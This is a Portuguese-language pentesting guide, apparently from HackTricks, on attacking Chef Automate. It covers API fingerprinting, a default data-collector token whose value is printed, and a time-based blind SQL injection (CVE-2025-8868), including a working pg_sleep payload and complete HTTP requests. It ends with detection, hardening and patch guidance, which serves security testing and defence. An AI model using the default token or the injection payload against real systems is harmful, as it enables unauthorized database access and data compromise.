# Chef Automate Enumeration & Attacks

{{#include ../../banners/hacktricks-training.md}}

## Visão geral

Esta página reúne técnicas práticas para enumerar e atacar instâncias do Chef Automate, com ênfase em:
- Descobrir endpoints REST respaldados por gRPC-Gateway e inferir schemas de requisição via respostas de validação/erro
- Abusar do header de autenticação x-data-collector-token quando defaults estiverem presentes
- Time-based blind SQL injection na Compliance API (CVE-2025-8868) afetando o campo filters[].type em /api/v0/compliance/profiles/search

> Nota: Respostas do backend que incluem o header grpc-metadata-content-type: application/grpc tipicamente indicam um gRPC-Gateway fazendo bridge de chamadas REST para serviços gRPC.

## Recon: Architecture and Fingerprints

- Front-end: Frequentemente Angular. Bundles estáticos podem indicar paths da REST (ex.: /api/v0/...)
- API transport: REST para gRPC via gRPC-Gateway
- Respostas podem incluir grpc-metadata-content-type: application/grpc
- Fingerprints de database/driver:
- Corpos de erro que começam com pq: sugerem fortemente PostgreSQL com o driver Go pq
- Endpoints interessantes da Compliance (auth required):
- POST /api/v0/compliance/profiles/search
- POST /api/v0/compliance/scanner/jobs/search

## Auth: Data Collector Token (x-data-collector-token)

Chef Automate expõe um data collector que autentica requisições via um header dedicado:

- Header: x-data-collector-token
- Risco: Alguns ambientes podem manter um token default que fornece acesso a rotas de API protegidas. Default conhecido observado em ambientes:
- 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

Se presente, este token pode ser usado para chamar endpoints da Compliance API que normalmente exigem autenticação. Sempre tente rotacionar/desabilitar defaults durante o hardening.

## API Schema Inference via Error-Driven Discovery

Endpoints respaldados por gRPC-Gateway often leak erros de validação úteis que descrevem o modelo de requisição esperado.

Para /api/v0/compliance/profiles/search, o backend espera um corpo com um array filters, onde cada elemento é um objeto com:

- type: string (identificador do campo de filtro)
- values: array de strings

Example request shape:
```json
{
"filters": [
{ "type": "name", "values": ["test"] }
]
}
```
JSON malformado ou tipos de campo incorretos normalmente acionam respostas 4xx/5xx com dicas, e os headers indicam o comportamento do gRPC-Gateway. Use isso para mapear campos e localizar superfícies de injeção.

## API de Compliance SQL Injection (CVE-2025-8868)

- Endpoint afetado: POST /api/v0/compliance/profiles/search
- Ponto de injeção: filters[].type
- Classe de vulnerabilidade: time-based blind SQL injection in PostgreSQL
- Causa raiz: Falta de parametrização/whitelisting adequada ao interpolar o campo type em um fragmento SQL dinâmico (provavelmente usado para construir identifiers/WHERE clauses). Valores forjados em type são avaliados pelo PostgreSQL.

Working time-based payload:
```json
{"filters":[{"type":"name'||(SELECT pg_sleep(5))||'","values":["test"]}]}
```
Notas da técnica:
- Feche a string original com uma aspa simples '
- Concatene uma subquery que chame pg_sleep(N)
- Reentre no contexto de string via || para que o SQL final permaneça sintaticamente válido independentemente de onde type esteja incorporado

### Prova por latência diferencial

Envie requisições em pares e compare os tempos de resposta para validar a execução no servidor:

- N = 1 segundo
```
POST /api/v0/compliance/profiles/search HTTP/1.1
Host: <target>
Content-Type: application/json
x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

{"filters":[{"type":"name'||(SELECT pg_sleep(1))||'","values":["test"]}]}
```
- N = 5 segundos
```
POST /api/v0/compliance/profiles/search HTTP/1.1
Host: <target>
Content-Type: application/json
x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

{"filters":[{"type":"name'||(SELECT pg_sleep(5))||'","values":["test"]}]}
```
Comportamento observado:
- Tempos de resposta aumentam com pg_sleep(N)
- Respostas HTTP 500 podem incluir detalhes pq: durante sondagens, confirmando caminhos de execução de SQL

> Dica: Use um validador de tempo (por exemplo, múltiplas tentativas com comparação estatística) para reduzir ruído e falsos positivos.

### Impacto

Usuários autenticados — ou atores não autenticados abusando de um x-data-collector-token padrão — podem executar SQL arbitrário no contexto PostgreSQL do Chef Automate, colocando em risco a confidencialidade e integridade de perfis de compliance, configuração e telemetria.

### Versões afetadas / Correção

- CVE: CVE-2025-8868
- Orientação de atualização: Chef Automate 4.13.295 ou posterior (Linux x86) conforme avisos do fornecedor

## Detecção e Forense

- Camada de API:
- Monitore 500s em /api/v0/compliance/profiles/search onde filters[].type contenha aspas ('), concatenação (||) ou referências a funções como pg_sleep
- Inspecione cabeçalhos de resposta por grpc-metadata-content-type para identificar fluxos gRPC-Gateway
- Camada de banco de dados (PostgreSQL):
- Audite chamadas pg_sleep e erros de identificador malformado (frequentemente exibidos com prefixos pq: vindos do driver pq para Go)
- Autenticação:
- Registre e alerte sobre o uso de x-data-collector-token, especialmente valores padrão conhecidos, em caminhos da API

## Mitigações e Hardening

- Imediato:
- Rotacionar/desativar tokens padrão do data collector
- Restringir ingresso aos endpoints do data collector; impor tokens fortes e únicos
- Em nível de código:
- Parametrize consultas; nunca concatene fragmentos SQL em strings
- Aceitar estritamente apenas os valores permitidos para type no servidor (enum)
- Evite montagem dinâmica de SQL para identificadores/cláusulas; se comportamento dinâmico for necessário, use citação segura de identificadores e listas explícitas de permissão

## Checklist prático de testes

- Verifique se x-data-collector-token é aceito e se o valor padrão conhecido funciona
- Mapeie o schema de requisição da Compliance API induzindo erros de validação e lendo mensagens/headers de erro
- Teste por SQLi em campos menos óbvios “semelhantes a identificador” (por exemplo, filters[].type), não apenas em arrays de values ou campos de texto de nível superior
- Use técnicas baseadas em tempo com concatenação para manter o SQL sintaticamente válido através dos contextos

## References

- [Cooking an SQL Injection Vulnerability in Chef Automate (XBOW blog)](https://xbow.com/blog/cooking-an-sql-injection-vulnerability-in-chef-automate)
- [Timing trace (XBOW)](https://xbow-website.pages.dev/traces/chef-automate-sql-injection/)
- [CVE-2025-8868](https://www.cve.org/CVERecord?id=CVE-2025-8868)
- [gRPC-Gateway](https://github.com/grpc-ecosystem/grpc-gateway)
- [pq PostgreSQL driver for Go](https://github.com/lib/pq)

{{#include ../../banners/hacktricks-training.md}}
